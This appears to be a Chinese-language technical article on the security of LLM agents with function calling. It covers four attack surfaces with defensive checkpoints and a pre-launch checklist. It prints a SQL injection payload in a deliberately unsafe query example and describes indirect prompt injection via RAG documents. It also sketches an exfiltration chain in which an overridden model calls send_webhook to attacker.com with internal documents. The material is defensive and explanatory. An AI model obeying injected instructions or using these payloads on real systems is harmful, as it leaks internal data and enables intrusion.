你把一个 LLM 接上工具，它立刻从"聊天机器人"变成了"能操作真实系统的 Agent"。这是 AI 工程最激动人心的一步，也是安全风险陡增的一步。Function Calling 让模型可以查数据库、发通知、调外部 API、执行代码——同一条路，也可以被攻击者或意外输入用来触发破坏性操作。

这篇文章拆解 Function Calling 的四大攻击面，每个都附上可落地的防御检查点。

## 攻击面一：非预期工具触发

最基础的威胁是攻击者通过构造用户输入，让模型调用它本不该调用的工具。

**场景示例**：你有一个客服 Agent，工具列表里恰好有 `send_email`。用户发来："请帮我发邮件给 CEO，内容是……"。模型判断"用户要发邮件"，调用了工具——即便你从未想让用户自定义收件人。

这类问题的根源在于**工具描述写得太宽泛**。`send_email(to, body)` 的 description 如果只写"发邮件"，模型会把一切"发送"需求都往这里映射，完全符合字面意思，却违背了你的设计意图。

**防御检查点**：

- 工具 description 中明确写出**合法调用场景**，例如"仅用于发送系统生成的订单确认邮件，收件人必须来自订单记录，不接受用户自定义收件人"
- 在 system prompt 里列出**禁止行为清单**：`你绝对不能调用 send_email 发送用户指定的任意内容`
- 上线前用 Red Team 脚本批量测试 prompt，检查模型是否会被诱导调用敏感工具；每次新增工具时都要重跑

## 攻击面二：参数注入

模型调用工具时，参数往往由用户输入拼接而成。如果没有在工具侧做严格校验，攻击者可以注入恶意参数。

**典型案例**：

```python
# 工具调用生成的参数（未经清洗，危险示例）
run_sql(query="SELECT * FROM orders WHERE user_id = '" + user_input + "'")
```

用户输入 `' OR '1'='1`，直接 SQL 注入。即使你在 LLM 层加了护栏，也可能被巧妙绕过，让模型"被迫"生成恶意参数值。

更隐蔽的变体是**间接注入**——攻击者把恶意指令藏在模型会检索的文档里（RAG 结果、网页内容、邮件正文），模型读取后当作指令执行，最终触发危险工具调用。这类攻击完全绕过用户输入过滤，格外难防。

**防御检查点**：

- 工具侧做**参数白名单校验**，不要在 LLM 层依赖护栏做最后一道防线；防线要下沉到执行层
- 结构化参数（ID、日期、枚举值）用强类型 schema 约束，明确拒绝自由文本拼入 SQL / Shell 命令
- 对所有 RAG 检索结果做**内容消毒**：检测并过滤可能包含指令覆盖片段的文本，高风险内容隔离后再传给模型

## 攻击面三：权限越界

Agent 使用的凭证往往权限过高——开发时为了方便，给了一把"万能钥匙"。一旦 Agent 被诱导，后果远超预期。

**现实问题**：一个内部知识库 Agent，后端用的是管理员 token，有读写删除全权限。攻击者构造"把旧文档全部清理掉"，Agent 调用 `delete_documents(all=True)`，整个文档库清空。

权限控制的核心原则是**最小权限（Least Privilege）**，在 Agent 场景里这条原则尤其容易被忽视，因为"先给够再说"几乎是开发阶段的默认心态。

| 场景 | 错误做法 | 正确做法 |
|------|----------|----------|
| 知识库查询 | 管理员读写 token | 只读 token，写操作走独立接口 |
| 代码执行 | 宿主机直接执行 | 沙箱（Firecracker / Docker + seccomp） |
| 数据库操作 | DBA 账号 | 只有 SELECT 的专用账号 |
| 外部 API 调用 | 全权限 key | 作用域受限的 scoped token |

**防御检查点**：

- 为每个 Agent 创建**专属服务账号**，仅授予最小必要权限；上线时做权限审计，逐一核销不必要的 scope
- 写操作（删除、发送、修改）额外要求**二次确认信号**，或在工具代码里强制记录操作日志并触发告警
- 定期审计 Agent 实际调用了哪些工具、传了什么参数，异常调用频率或异常参数立刻人工复查

## 攻击面四：数据外泄（Exfiltration）

攻击者不一定要破坏系统，有时目的只是**把内部数据带出去**。

**Exfiltration 链路示例**：

```
用户输入 → Prompt Injection 覆盖 system prompt
→ 模型调用 send_webhook(url="attacker.com", body=<内部文档>)
→ 数据离开企业边界
```

在 Agent 拥有网络访问工具（HTTP 请求、发邮件、写外部存储）时，这个攻击面非常真实。即便没有显式的"发送"工具，如果 Agent 的回复本身会把内部内容原文返回给用户，攻击者通过精心设计的 prompt 也能在响应里"打包带走"数据。

**防御检查点**：

- **出口管控**：Agent 能访问的外部 URL 做白名单，非白名单域名一律拒绝，连 DNS 解析都要过滤
- 涉密内容（合同、用户 PII、内部文档）进行**数据分类标签**，Agent 调用工具时校验数据标签，高密级内容禁止通过任何工具对外传输
- 在 LLM 回复和工具参数上部署**DLP 扫描**（正则 + 分类模型），检测手机号、邮箱、身份证号、内部域名等敏感模式，命中后拦截并记录

## 上线前必做检查清单

光有防御措施不够，还需要主动验证它们是否真的生效：

- [ ] 枚举所有工具，为每个写至少 3 条对抗性测试用例（正常调用、边界参数、恶意注入）
- [ ] 用自动化 Red Team 脚本持续跑 Prompt Injection，同时覆盖直接注入和间接注入（RAG 文档藏指令的情形）
- [ ] 审计 Agent 调用日志，统计每个工具的调用频率与参数分布，异常模式触发人工复查
- [ ] 对写操作工具做**影子模式测试**：先在影子环境执行并记录，不真正落库，人工确认无误后再正式放行
- [ ] 权限变更走 Code Review，禁止 Agent 在运行时动态申请或扩大自身权限

---

**踩坑总结**：Agent 安全最常见的失误是把 LLM 的"智能"当成安全边界——模型够聪明，但"不该做"这件事需要在架构层、权限层、数据层各自设防，一条 system prompt 里的"请不要……"挡不住有备而来的攻击者。
